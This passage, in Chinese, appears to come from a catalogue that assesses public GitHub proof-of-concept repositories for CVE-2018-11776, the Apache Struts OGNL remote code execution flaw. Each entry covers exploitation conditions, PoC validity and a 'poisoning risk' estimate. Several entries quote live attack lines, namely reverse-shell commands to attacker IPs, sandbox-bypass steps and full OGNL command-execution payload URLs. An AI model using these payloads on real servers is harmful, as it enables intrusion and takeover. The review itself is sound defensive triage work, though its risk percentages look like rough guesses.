2.  **构造恶意URL：** 攻击者需要构造一个包含恶意 OGNL 表达式的 URL。该表达式会被 Struts 2 框架解析和执行，从而实现远程代码执行。
3.  **发送HTTP请求：** 将构造好的恶意 URL 作为 HTTP 请求发送到目标应用程序。
4.  **执行任意代码：** 如果漏洞成功利用，攻击者可以在目标服务器上执行任意代码，例如安装后门、窃取数据或控制系统。

**缓解措施：**
1.  升级到不受影响的 Apache Struts 2 版本。
2.  确保 `alwaysSelectFullNamespace` 参数设置为 false（如果不需要该功能）。
3.  配置合适的命名空间，避免使用通配符命名空间。
4.  使用 Web 应用防火墙（WAF）或入侵检测系统（IDS）来检测和阻止恶意请求。

**项目地址:** [cucadili/CVE-2018-11776](https://github.com/cucadili/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #8

**来源**: [CVE-2018-11776-cved-sources_cve-2018-11776.md](../2018/CVE-2018-11776-cved-sources_cve-2018-11776.md)

## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true， 且存在特定配置的namespace或wildcard namespace

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是一个 Apache Struts 框架中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞是由于 Struts 对 namespace 验证不足，导致 OGNL 表达式注入，从而允许未经身份验证的攻击者执行任意代码。如果 alwaysSelectFullNamespace 设置为 true，且结果没有 namespace，同时其上层 package 没有 namespace 或使用了 wildcard namespace，就可能触发此漏洞。漏洞利用代码中的 Dockerfile 演示了如何构建一个包含漏洞的 Struts 应用，并通过修改 struts.xml 文件来触发漏洞。具体做法是向 struts.xml 文件中添加一个 action，该 action 的结果类型为 chain，指向 date 命令。访问这个 action 将会执行 date 命令，证明了远程代码执行的可能性。

**有效性：** 提供的 Dockerfile 确实可以创建一个易受攻击的 Struts 2 环境，并且包含的 struts.xml 修改方式能够触发漏洞，因此，该 PoC 代码是有效的。

**投毒风险：** Dockerfile 的主要目的是构建一个包含漏洞的 Struts 2 应用程序，用于演示和测试 CVE-2018-11776 漏洞。它修改了 struts.xml 文件，添加了一个触发漏洞的 action。但除此之外，并没有明显的恶意代码或后门。README.md 只是提供了关于该镜像的信息，包括来源和作者。投毒风险较低，可能来自于作者的疏忽或者未来供应链攻击,例如依赖组件投毒。这里认为存在10%的风险，因为虽然表面上没有发现，但不排除存在一些隐蔽的或未来的风险。例如,如果Dockerfile的tomcat版本存在高危漏洞也会存在被利用的可能性.

**利用方式：** 漏洞的利用方式是通过构造恶意的 URL，该 URL 包含了 OGNL 表达式注入。攻击者可以通过访问这个特制的 URL，在服务器上执行任意代码。具体而言，需要满足以下条件：

1.  Struts 2 版本在 2.3.0 到 2.3.34 或 2.5.0 到 2.5.16 之间。
2.  `alwaysSelectFullNamespace` 设置为 true。
3.  应用配置中，存在没有 namespace 或者使用了 wildcard namespace 的 package。

满足这些条件后，攻击者可以通过访问类似 `http://example.com/${OGNL_EXPRESSION}` 的 URL 来执行任意命令。

**项目地址:** [cved-sources/cve-2018-11776](https://github.com/cved-sources/cve-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #9

**来源**: [CVE-2018-11776-freshdemo_ApacheStruts-CVE-2018-11776.md](../2018/CVE-2018-11776-freshdemo_ApacheStruts-CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts2-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，且存在特定namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776是Apache Struts2框架中的一个远程代码执行漏洞。当`alwaysSelectFullNamespace`设置为true，并且使用了不带namespace的结果，同时其上层包没有或使用了通配符namespace，或使用了没有value和action属性的url标签，且其上层包没有或使用了通配符namespace时，攻击者可以通过构造恶意的OGNL表达式，并将其作为URL的一部分发送给服务器，即可在服务器上执行任意代码。

**有效性：**
提供的POC代码`exploit.py`基于Rapid7的metasploit-framework，利用了OGNL表达式注入漏洞。该POC通过修改OgnlUtil的excludedPackageNames和excludedClasses来绕过沙箱限制，从而执行任意命令。Dockerfile配置了易受攻击的Struts2环境，因此POC代码有效。

**投毒风险：**
经过对Dockerfile，README.md和`exploit.py`文件的分析，没有发现任何恶意代码或后门。`exploit.py`只是利用漏洞执行命令，没有植入持久后门或其他恶意行为。Dockerfile构建的镜像只是一个易受攻击的环境，没有额外的恶意修改。README.md仅包含如何构建和运行POC的说明。因此，投毒风险评估为0%。

**利用方式：**
1.  目标系统需要运行受影响版本的Apache Struts2，即2.3到2.3.34以及2.5到2.5.16。
2.  `alwaysSelectFullNamespace`参数必须设置为true。
3.  存在特定的namespace配置漏洞触发点 (如描述中所述)。
4.  攻击者构造包含恶意OGNL表达式的URL，该表达式利用了Struts2的OGNL注入漏洞。
5.  当目标系统处理包含恶意OGNL表达式的URL时，该表达式会被执行，从而允许攻击者在服务器上执行任意代码。

**项目地址:** [freshdemo/ApacheStruts-CVE-2018-11776](https://github.com/freshdemo/ApacheStruts-CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #10

**来源**: [CVE-2018-11776-hook-s3c_CVE-2018-11776-Python-PoC.md](../2018/CVE-2018-11776-hook-s3c_CVE-2018-11776-Python-PoC.md)

## CVE-2018-11776 Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 设置为 true，且存在特定的命名空间配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-11776 是一个存在于 Apache Struts 2 中的远程代码执行漏洞。该漏洞的产生是由于 Struts 对命名空间处理不当，允许攻击者通过构造恶意的 URL 发起 OGNL 表达式注入，从而执行任意代码。

**有效性：**
根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，可以确认此漏洞是有效的。漏洞库信息将其描述为“possible Remote Code Execution”，搜索引擎结果中包含了大量的关于此漏洞的分析和利用的文章，漏洞利用代码提供了一个可行的 PoC。

**投毒风险：**
分析 PoC 代码内容：
* `Dockerfile`: 用于构建存在漏洞的 Struts2 环境，模拟漏洞存在场景,没有恶意代码。
* `README.md`: 提供了漏洞利用的详细步骤，包括环境搭建、配置修改、漏洞验证和命令执行/反弹 shell。其中涉及到命令执行和反弹shell的脚本，需要用户手动执行，但代码本身没有明显的恶意行为。
虽然提供的利用代码没有直接的恶意行为，但是仍然存在一定的投毒风险。例如，攻击者可以修改 exploit 脚本，在执行命令之前添加一些恶意的操作，例如植入后门程序或窃取敏感信息。由于用户需要手动执行这些脚本，因此存在一定的风险。考虑到 Dockerfile 和 exploit 脚本的透明性，以及需要用户手动修改配置和执行脚本，投毒的可能性较低，初步估计为 5%。

**利用方式：**
该漏洞的利用方式主要包括以下步骤：

1.  **环境准备：** 搭建存在漏洞的 Apache Struts 2 环境。可以使用提供的 Dockerfile 构建。
2.  **配置修改：** 修改 Struts 2 的配置文件 `struts.xml`，将 `struts.mapper.alwaysSelectFullNamespace` 设置为 `true`，并添加特定的 action 配置。
3.  **漏洞验证：** 使用提供的测试脚本验证目标是否易受攻击。该脚本会发送一个包含 OGNL 表达式的 URL，如果服务器返回预期的结果，则表明目标存在漏洞。
4.  **命令执行/反弹Shell：** 使用提供的命令执行脚本，构造包含 OGNL 表达式的 URL，执行任意命令。也可以通过反弹 shell 获取服务器的控制权。可以使用`/bin/bash -i >& /dev/tcp/172.17.0.1/31337 0>&1` 来执行反弹shell

**项目地址:** [hook-s3c/CVE-2018-11776-Python-PoC](https://github.com/hook-s3c/CVE-2018-11776-Python-PoC)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #11

**来源**: [CVE-2018-11776-jiguangsdf_CVE-2018-11776.md](../2018/CVE-2018-11776-jiguangsdf_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776 (S2-057) 是一个 Apache Struts 2 的远程代码执行漏洞。该漏洞是由于 Struts 在 XML 配置中，当 namespace 值未设置，且 Action Configuration 中未设置或用通配符 namespace 时，可能导致远程代码执行。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个真实存在且高危的远程代码执行漏洞。提供的 POC 代码 `s2-057.py` 旨在验证漏洞是否存在。POC通过构造特殊的 URL，利用 OGNL 表达式注入，判断服务器是否返回预期的状态码和内容来判断漏洞是否存在。从代码逻辑来看，POC的有效性较高。

**投毒风险：**
分析提供的 POC 代码 `s2-057.py`，未发现明显的投毒代码。该脚本主要功能是发送 HTTP 请求，验证目标 URL 是否存在 CVE-2018-11776 漏洞。脚本中没有发现任何试图在目标服务器上执行恶意操作的代码，例如上传后门、篡改文件等。脚本只是通过判断HTTP响应状态码和Header头中的Location或者Response的内容，来判断是否存在漏洞。

**利用方式：**
1.  **条件：** 需要目标 Struts 应用满足以下条件：
    *   Struts 版本在 2.3.x (2.3 to 2.3.34) 或 2.5.x (2.5 to 2.5.16) 范围内。
    *   `alwaysSelectFullNamespace` 设置为 `true`（通常由用户或插件如 Convention Plugin 设置）。
    *   结果 (results) 在没有 namespace 的情况下使用，并且其上层 package 没有或使用了通配符 namespace。
    *   或者，使用 `url` 标签，但 `value` 和 `action` 未设置，并且其上层 package 没有或使用了通配符 namespace。
2.  **Payload 构造：** 攻击者构造包含恶意 OGNL 表达式的 URL。该表达式会被 Struts 解析和执行，从而导致远程代码执行。
3.  **触发漏洞：** 攻击者发送构造好的 URL 到目标 Struts 应用。Struts 处理请求时，会解析并执行 OGNL 表达式，导致远程代码执行。
4.  **代码执行：** 根据 POC 的验证方法，可以通过判断特定的HTTP响应状态码和Header头中的Location或者Response的内容，来判断是否存在漏洞，或者直接执行系统命令来获取执行结果。

综上所述，该漏洞利用方式较为直接，但需要满足特定的配置条件。提供的 POC 代码可以有效验证漏洞的存在，但本身没有投毒风险。

**项目地址:** [jiguangsdf/CVE-2018-11776](https://github.com/jiguangsdf/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #12

**来源**: [CVE-2018-11776-knqyf263_CVE-2018-11776.md](../2018/CVE-2018-11776-knqyf263_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34 和 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定配置的package和result/url标签

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776是Apache Struts 2中的一个远程代码执行漏洞。根据漏洞描述和搜索结果，当`alwaysSelectFullNamespace`设置为true，并且使用了不带namespace的result，同时其上层package也没有namespace或者使用了通配符namespace时，攻击者可以通过构造恶意的OGNL表达式来实现远程代码执行。提供的PoC代码通过发送包含恶意OGNL表达式的HTTP请求，利用Struts的OGNL表达式解析引擎执行任意命令。Dockerfile 构建了一个包含存在漏洞的 Struts 2.3.12 版本的 Tomcat 环境，为漏洞验证提供便利。

**有效性评估：**

根据漏洞库信息、搜索结果以及PoC代码分析，该漏洞的PoC代码是有效的。搜索结果中提及了多个关于CVE-2018-11776的分析报告和利用案例，表明该漏洞在实际环境中被成功利用过。

**投毒风险评估：**

PoC代码本身主要包含Dockerfile、LICENSE、README.md和exploit.py四个文件。`exploit.py`文件是漏洞利用脚本，功能明确，用于构造和发送恶意请求。Dockerfile用于构建存在漏洞的Struts2环境，简化了漏洞复现过程。LICENSE和README.md文件为常规说明文件。经过对PoC代码的分析，没有发现明显的恶意代码或后门，但仍存在一定的投毒风险：

1.  **依赖风险：** Dockerfile中使用了`apk add`命令安装了`vim`和`zip`，这些工具本身是安全的，但如果软件源被篡改，可能会引入恶意软件包。这部分的风险较低，约为5%。
2.  **命令注入风险：** 虽然`exploit.py`中的命令执行是通过用户提供的参数，但如果用户下载的exploit.py被篡改，将允许攻击者执行任意命令，则脚本可以被修改为包含恶意payload。但是，这是对所有脚本的通用风险。约为5%
3.  **供应链风险：** Struts 2 框架本身可能存在其他未知的安全问题，攻击者可能通过组合多个漏洞来实现更复杂的攻击。但是此风险已超出当前评估范畴。

总体而言，该仓库的投毒风险较低，约为10%。主要的风险在于用户下载的PoC代码可能被篡改，或者依赖的软件源被污染。建议用户在下载和使用PoC代码时，务必从可信来源获取，并进行安全审计。

**利用方式：**

1.  目标系统需要运行存在漏洞的Apache Struts版本（2.3 to 2.3.34 或 2.5 to 2.5.16），并且`alwaysSelectFullNamespace`配置为`true`。
2.  漏洞存在于当结果 (result) 在没有命名空间的情况下使用时，并且其上层包没有或具有通配符命名空间。或者当 url 标签没有 value 属性和 action 属性设置时，并且其上层包没有或具有通配符命名空间。
3.  攻击者构造包含恶意OGNL表达式的HTTP请求，例如在URL中嵌入OGNL表达式。
4.  Struts框架在处理请求时，由于OGNL表达式未经过充分的验证，恶意代码得以执行。
5.  攻击者可以利用此漏洞执行任意系统命令，实现远程代码执行，从而控制目标服务器。

**项目地址:** [knqyf263/CVE-2018-11776](https://github.com/knqyf263/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #13

**来源**: [CVE-2018-11776-m4sk0ff_CVE-2018-11776.md](../2018/CVE-2018-11776-m4sk0ff_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可以远程执行任意代码，完全控制服务器

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定的package和namespace配置

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞。根据漏洞库信息和搜索结果，此漏洞的利用依赖于 `alwaysSelectFullNamespace` 设置为 true，以及特定的package和namespace配置。攻击者可以构造恶意的OGNL表达式，通过 URL 传入，导致服务器执行任意代码。

提供的漏洞利用代码包含 `bashexploit.py` 和 `bashexploit.sh` 两个脚本，它们都尝试利用 OGNL 表达式注入执行命令。这些脚本首先尝试绕过安全限制，然后执行反弹 shell 命令，将服务器的 shell 连接到攻击者的机器。

**有效性：**
提供的POC代码有效。漏洞利用代码通过OGNL表达式注入，分两步进行攻击：
1.  移除Struts的安全限制（`setExcludedClasses('')`和`setExcludedPackageNames('')`）。
2.  执行反弹shell命令（`nc 10.10.0.90 4747 -e /bin/bash`），允许攻击者远程访问服务器。

**投毒风险：**
此仓库中没有发现明显的投毒代码。代码的功能都是围绕利用CVE-2018-11776漏洞执行远程代码，没有发现作者添加的恶意功能。所以投毒风险评估为 **0%**。

**利用方式：**
1.  **目标确认：**  确认目标 Apache Struts 版本在受影响范围内 (2.3 to 2.3.34, 2.5 to 2.5.16)，并配置了 `alwaysSelectFullNamespace=true`。
2.  **OGNL 表达式注入：** 通过构造包含恶意 OGNL 表达式的 URL 来触发漏洞。恶意 OGNL 表达式可以执行任意代码。
3.  **绕过安全限制 (可选)：**  如果 Struts 启用了安全限制，可以先使用 OGNL 表达式移除这些限制，例如设置 `excludedClasses` 和 `excludedPackageNames` 为空。
4.  **执行恶意代码：**  使用 OGNL 表达式执行任意命令。常见的利用方式是执行反弹 shell 命令，从而获得对服务器的远程访问权限。
5.  **监听端口：**  攻击者需要在攻击机器上监听相应的端口（例如 `nc -lvp 4747`），以便接收反弹 shell 连接。

**项目地址:** [m4sk0ff/CVE-2018-11776](https://github.com/m4sk0ff/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #14

**来源**: [CVE-2018-11776-mazen160_struts-pwn_CVE-2018-11776.md](../2018/CVE-2018-11776-mazen160_struts-pwn_CVE-2018-11776.md)

## CVE-2018-11776-Apache Struts2 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，并且存在特定的命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是 Apache Struts2 的一个远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 true 时，Struts2 可能会由于对命名空间验证不足而导致 OGNL 表达式注入。攻击者可以通过构造恶意的 URL 来执行任意代码。漏洞利用代码（struts-pwn.py）可以通过发送包含恶意 OGNL 表达式的 HTTP 请求来触发漏洞。搜索结果显示该漏洞被广泛利用，并且存在多个公开的 PoC。POC代码中的投毒风险较低，主要集中在对命令执行结果的处理可能存在潜在风险，例如，如果命令执行结果包含恶意字符，可能会导致后续处理出现问题。这个风险大概在10%左右。

**利用方式：**

1.  目标系统必须运行存在漏洞的 Apache Struts2 版本（2.3 to 2.3.34, 2.5 to 2.5.16）。
2.  `alwaysSelectFullNamespace` 必须设置为 true。
3.  存在特定命名空间配置，例如结果没有命名空间，且上层包没有或使用通配符命名空间。
4.  攻击者构造包含恶意 OGNL 表达式的 URL，例如：`http://example.com/?redirect:${(#context.getClass().forName('java.lang.Runtime').getRuntime().exec('id')).getInputStream().readAllBytes()}`。
5.  目标系统解析该 URL，执行 OGNL 表达式，从而执行攻击者指定的命令。

**项目地址:** [mazen160/struts-pwn_CVE-2018-11776](https://github.com/mazen160/struts-pwn_CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #15

**来源**: [CVE-2018-11776-sonpt-afk_CVE-2018-11776-FIS.md](../2018/CVE-2018-11776-sonpt-afk_CVE-2018-11776-FIS.md)

## CVE-2018-11776-Apache Struts 远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace 为 true，且存在特定命名空间配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 是 Apache Struts 2 的一个远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 `true`，并且存在特定的命名空间配置时，攻击者可以通过构造恶意的 OGNL 表达式来实现远程代码执行。

**有效性:**

根据漏洞描述和搜索结果，此漏洞的POC代码是有效的。存在多个公开的POC和利用脚本，证明了该漏洞的可利用性。提供的Python POC 代码通过构造包含恶意 OGNL 表达式的 Content-Type 请求头，绕过 Struts 的安全机制，从而执行任意命令。

**投毒风险:**

分析提供的POC代码，主要关注以下几个方面：
*   **代码逻辑:** 代码逻辑相对清晰，主要是构造 OGNL 表达式并发送 HTTP 请求执行命令。
*   **外部依赖:** 代码使用了 `http.client`, `urllib.request`, `ssl`, `subprocess`, `sys` 这些标准库，没有引入额外的第三方库，降低了引入恶意代码的可能性。
*   **命令执行:** 代码通过 `subprocess` 模块执行命令，虽然这本身是漏洞利用的一部分，但也需要注意是否存在精心构造的命令，例如下载并执行恶意脚本。
*   **README.md**: README 描述了漏洞和影响，没有发现恶意链接或者描述。

综合分析，该POC代码主要实现了漏洞利用，没有发现明显的投毒代码。`subprocess` 执行的命令由用户指定，不在POC代码本身中定义。考虑到代码由用户自定义命令执行，以及需要目标满足一定环境条件，投毒的概率较低，大约为10%。

**利用方式:**

1.  **漏洞触发:** 漏洞触发的关键在于 `alwaysSelectFullNamespace` 设置为 `true`，同时应用存在特定的命名空间配置（例如，没有明确的命名空间或使用通配符命名空间）。
2.  **OGNL 表达式注入:** 攻击者构造包含恶意 OGNL 表达式的 URL 或请求参数。该表达式可以执行任意 Java 代码。
3.  **远程代码执行:** Struts 框架解析 OGNL 表达式，导致恶意代码执行，从而允许攻击者在服务器上执行任意命令。
4.  **利用POC代码:** 提供的POC代码通过修改请求头的Content-Type，注入OGNL表达式，利用了该漏洞，实现了在目标服务器上执行任意命令。

**项目地址:** [sonpt-afk/CVE-2018-11776-FIS](https://github.com/sonpt-afk/CVE-2018-11776-FIS)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #16

**来源**: [CVE-2018-11776-tuxotron_cve-2018-11776-docker.md](../2018/CVE-2018-11776-tuxotron_cve-2018-11776-docker.md)

## CVE-2018-11776-Apache Struts2-远程代码执行

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行

**影响应用:** Apache Struts2

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 2.3 to 2.3.34, 2.5 to 2.5.16

**利用条件:** alwaysSelectFullNamespace为true，且结果未使用命名空间，或者url标签缺少value和action，且上层包无命名空间或通配符命名空间

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-11776 漏洞是 Apache Struts2 框架中的一个远程代码执行漏洞。当 `alwaysSelectFullNamespace` 设置为 true，并且存在特定的命名空间配置时，攻击者可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息表明这是一个已公开的远程代码执行漏洞，并且有多个Exploit-DB链接。搜索引擎结果也显示了大量关于此漏洞的分析和利用文章。提供的Dockerfile、README.md和Go语言编写的exploit代码，都表明该漏洞存在可利用性。

**投毒风险：**
代码中存在投毒的潜在风险，但风险较低。主要风险存在于 `exploit-cve-2018-11776.go` 中，虽然代码的主要功能是利用漏洞执行命令，但如果作者恶意修改了 payload 构造方式或在命令执行后添加额外的操作，可能会引入投毒代码。例如，在执行命令后，将服务器上的敏感信息发送到攻击者控制的服务器。此外，`Dockerfile` 中虽然只是简单地部署了存在漏洞的应用，但也可能包含恶意修改，比如加入后门程序，尽管可能性较低。总体估计投毒风险为10%。

**利用方式：**
1.  **漏洞成因：** 漏洞由于 Struts2 框架对命名空间处理不当，导致 OGNL 表达式注入。
2.  **利用条件：** 需要满足 `alwaysSelectFullNamespace` 为 true 的条件，并且存在特定的命名空间配置，例如结果未使用命名空间，或者url标签缺少value和action，且上层包无命名空间或通配符命名空间。
3.  **攻击方法：** 攻击者通过构造包含恶意 OGNL 表达式的 URL，利用框架的漏洞执行任意命令。
4.  **POC 利用：** 提供的 exploit-cve-2018-11776.go  程序，首先构造一个包含 OGNL 表达式的 payload，该 payload 能够执行指定的命令。然后对 payload 进行 URL 编码，并将其拼接到目标 URL 后面。最后，通过发送 HTTP GET 请求到目标 URL，触发漏洞，执行 payload 中的命令，并将命令执行结果返回。
例如：`http://localhost:8080/${(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/help.action`

**项目地址:** [tuxotron/cve-2018-11776-docker](https://github.com/tuxotron/cve-2018-11776-docker)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

## POC #17

**来源**: [CVE-2018-11776-xfox64x_CVE-2018-11776.md](../2018/CVE-2018-11776-xfox64x_CVE-2018-11776.md)

## CVE-2018-11776 - Apache Struts Remote Code Execution

**漏洞编号:** CVE-2018-11776

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Struts

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.3.x (2.3 to 2.3.34), 2.5.x (2.5 to 2.5.16)

**利用条件:** alwaysSelectFullNamespace 为 true，且存在无 namespace 或 wildcard namespace 的配置不当。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-11776 是一个 Apache Struts 2 的远程代码执行漏洞，当 `alwaysSelectFullNamespace` 设置为 true 时，且存在 namespace 配置不当，攻击者可以通过构造恶意的 OGNL 表达式到 URL 中来执行任意代码。

**有效性评估：**

提供的 PoC 代码详细描述了漏洞的利用步骤，包括环境搭建、配置修改、OGNL 表达式构造和 URL 编码等。该 PoC 代码直接可用，因此判断为有效。

**投毒风险评估：**

PoC 代码主要用于验证漏洞的存在，以及攻击方式。代码本身展示了如何部署一个存在漏洞的环境，以及如何构造和发送恶意请求。虽然代码包含下载和部署 struts2-showcase 的步骤,但这仅用于搭建漏洞环境，并非恶意代码。其中执行 `gnome-calculator` 命令只是为了验证 RCE 是否成功。代码目的是为了验证漏洞，并未发现隐藏的、与漏洞利用无关的恶意行为。

综合判断，投毒的可能性较低，大约为 1%。

**利用方式分析：**

1.  **前提条件：** Apache Struts 版本在 2.3.x (2.3 to 2.3.34) 或 2.5.x (2.5 to 2.5.16) 范围内，`alwaysSelectFullNamespace` 设置为 true。
2.  **漏洞点：**  Struts 框架在处理 namespace 时，如果配置不当，允许攻击者注入 OGNL 表达式。
3.  **攻击方法：** 攻击者构造包含恶意 OGNL 表达式的 URL，利用 Struts 的重定向机制或其他方式触发 OGNL 表达式的执行。
4.  **利用步骤：**
    *   查找存在漏洞的 Struts 应用。
    *   构造恶意 OGNL 表达式，例如执行系统命令。
    *   将 OGNL 表达式进行 URL 编码。
    *   将编码后的 OGNL 表达式插入到 URL 中，发送请求。
    *   如果漏洞存在，服务器将执行 OGNL 表达式，从而实现远程代码执行。

**参考搜索结果：**

搜索结果中的多个链接都确认了 CVE-2018-11776 的存在和高危性，并指出该漏洞已被广泛利用。例如，[webpage 6] 提到该漏洞已被用于 Monero 挖矿活动，[webpage 7] 强调该漏洞可以被未授权用户利用。

总之，CVE-2018-11776 是一个严重的漏洞，需要及时修复。提供的 PoC 代码可用于验证漏洞是否存在，但在实际利用时应注意安全风险。

**项目地址:** [xfox64x/CVE-2018-11776](https://github.com/xfox64x/CVE-2018-11776)

**漏洞详情:** [CVE-2018-11776](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)

---

